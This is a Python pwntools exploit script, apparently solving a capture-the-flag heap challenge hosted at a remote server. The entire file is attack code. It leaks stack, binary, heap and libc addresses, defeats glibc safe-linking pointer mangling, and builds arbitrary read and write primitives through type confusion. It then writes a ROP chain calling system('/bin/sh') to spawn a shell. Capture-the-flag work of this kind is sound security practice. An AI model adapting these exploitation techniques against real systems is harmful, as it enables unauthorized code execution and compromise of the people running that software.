from pwn import *

elf = exe = ELF('./chall')
libc = ELF('./libc.so.6')

libc.sym['POP_RDI'] = 0x000000000010f75b # : pop rdi ; ret
libc.sym['RET'] = 0x000000000010f75c # : ret

io = remote('tcp.sasc.tf', 3279)

def choice(index: int):
    io.sendlineafter(b'> ', b'%d' % index)

def crack_mangle_addr(mangled_addr: int) -> int:
    key: int = 0
    for i in range(4, -1, -1):
        cur_mask = 0xfff << (4 * 3 * i)
        key |= (mangled_addr ^ (key >> 12)) & cur_mask
    return key

def add_storage(storage_desc, items) -> list[int]:
    choice(1)
    items_idx = list()
    io.sendlineafter(b'Enter storage description: ', storage_desc)
    
    for i, item_desc in enumerate(items):
        io.sendlineafter(b'Enter item descripton: ', item_desc)
        io.recvuntil(b"Item #")
        items_idx.append(int(io.recvuntil(b" was ")[:-5]))
        if i < len(items) - 1:
            io.sendlineafter(b'Do you want to add another one? (y/n) ', b'y')
        else:
            io.sendlineafter(b'Do you want to add another one? (y/n) ', b'n')
    return items_idx

def update_item(item_id: int, new_desc: bytes):
    choice(2)
    io.sendlineafter(b'Enter item #ID: ', str(item_id).encode())
    io.sendlineafter(b'Enter new item description: ', new_desc)

def delete_item(item_id: int):
    choice(3)
    io.sendlineafter(b'Enter item #ID: ', str(item_id).encode())

def create_feedback(feedback: bytes):
    choice(4)
    io.sendlineafter(b'Enter feedback: ', feedback)

def update_feedback(data: bytes | None = None) -> bytes:
    choice(4)
    io.recvuntil(b"You are alredy left feedback: \"")
    leak_data = io.recvuntil(b'"')[:-1]
    if data is None:
        io.sendlineafter(b"Do you want to change it? (y/n) ", b"n")
    else:
        io.sendlineafter(b"Do you want to change it? (y/n) ", b"y")
        io.sendlineafter(b"Enter new feedback: ", data)

    return leak_data

def exit_prog():
    choice(5)

def uninitialized_leak():
    io.sendlineafter(b'> ', b'something')
    io.recvuntil(b"Bad option: ")
    return int(io.recvline())

MAX_ITEMS = 64
def decrement_zero_storage(delta: int):
    remaining = delta
    while remaining > 0:
        batch = min(remaining, MAX_ITEMS)
        items_idx = add_storage(b"A" * 255, [b"B" * 255] * batch)
        for item_id in items_idx:
            update_item(item_id, b"")
            delete_item(item_id)
        remaining -= batch

# ========= STAGE 1: LEAK STACK =========
stack_leak = uninitialized_leak()
log.success(f"Stack leak: {hex(stack_leak)}")

# ========= STAGE 2: TYPE CONFUSION FOR FEEDBACK =========
add_storage(b"A" * 0x8, [b"B" * 0x10])

exe.address = uninitialized_leak() - 0x4880
log.success(f"Binary leak: {hex(exe.address)}")

# Fill up tcache
add_storage(b"A" * 1, [b"B" * 0x10])
add_storage(b"A" * 1, [b"B" * 0x10])

# Free storage №0
delete_item(0)

add_storage(b"A" * 0x80, [b"L" * 255] * 2)

# Allocate feedback at storage №0 freed chunk
create_feedback(b"C" * 128)

add_storage(b"A" * 255, [b"B" * 255])
add_storage(b"A" * 255, [b"B" * 255])
add_storage(b"A" * 0x50, [b"B" * 255])

delete_item(0)

# ========= STAGE 3: LEAK HEAP BASE =========
decrement_zero_storage(0x1a0)
leak_mangled_addr = u64(update_feedback().ljust(8, b'\x00'))
heap_base = crack_mangle_addr(leak_mangled_addr) - 0x880
heap_key = heap_base >> 12
log.success(f"heap_key: {hex(heap_key)}\nheap_base: {hex(heap_base)}")

# ========= STAGE 4: REWRITE FEEDBACK POINTER TO CONTROL CHUNK =========
control_chunk_index = add_storage(b"A" * 1, [b"B" * 40])[0]
log.info(f"Control chunk index: {control_chunk_index}")
control_chunk_addr = heap_base + 0x1bf0
control_offset = 0x10
decrement_zero_storage(0x820)
update_feedback(p64(exe.symbols['feedback']))
update_feedback(p64(control_chunk_addr + control_offset))

# ========= STAGE 5: GET AR/AW =========
def AR(addr: int) -> bytes:
    payload = flat({
        control_offset - 2: addr
    })
    update_item(control_chunk_index, payload)
    return update_feedback()

def AW(addr: int, data: bytes) -> bytes:
    payload = flat({
        control_offset - 2: addr
    })
    update_item(control_chunk_index, payload)
    return update_feedback(data)

libc.address = u64(AR(exe.got['puts']).ljust(8, b'\x00')) - libc.symbols['puts']
log.success(f"libc address: {hex(libc.address)}")

# ========= STAGE 6: GET SHELL =========
payload = flat([
    libc.sym['RET'],
    libc.sym['POP_RDI'],
    next(libc.search(b"/bin/sh\x00")),
    libc.sym['system']
])
AW(stack_leak + 0x160 - 0x2c0, payload)

io.interactive()
